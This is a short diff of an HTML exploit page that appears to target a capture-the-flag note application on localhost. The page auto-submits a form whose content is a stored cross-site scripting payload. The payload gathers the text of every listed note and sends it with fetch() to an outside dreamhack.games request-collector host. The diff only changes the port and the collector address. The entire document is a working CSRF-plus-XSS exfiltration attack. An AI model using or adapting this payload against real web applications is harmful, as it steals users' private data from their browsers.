@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html>
 <body>
-<form id="f" method="POST" action="http://localhost:3000/note">
-  <textarea name="content"><script>(async()=>{const entries=[...document.querySelectorAll('.list li')].map(li=>li.innerText).join('\n---\n');await fetch('https://fpbevsk.request.dreamhack.games/?d='+encodeURIComponent(entries));})();</script></textarea>
+<form id="f" method="POST" action="http://localhost:3001/note">
+  <textarea name="content"><script>(async()=>{const entries=[...document.querySelectorAll('.list li')].map(li=>li.innerText).join('\n---\n');await fetch('https://pcitgol.request.dreamhack.games/?d='+encodeURIComponent(entries));})();</script></textarea>
 </form>
 <script>
   document.getElementById('f').submit();
-  setTimeout(()=>location='http://localhost:3000/note',1500);
+  setTimeout(()=>location='http://localhost:3001/note',1500);
 </script>
 </body>
 </html>
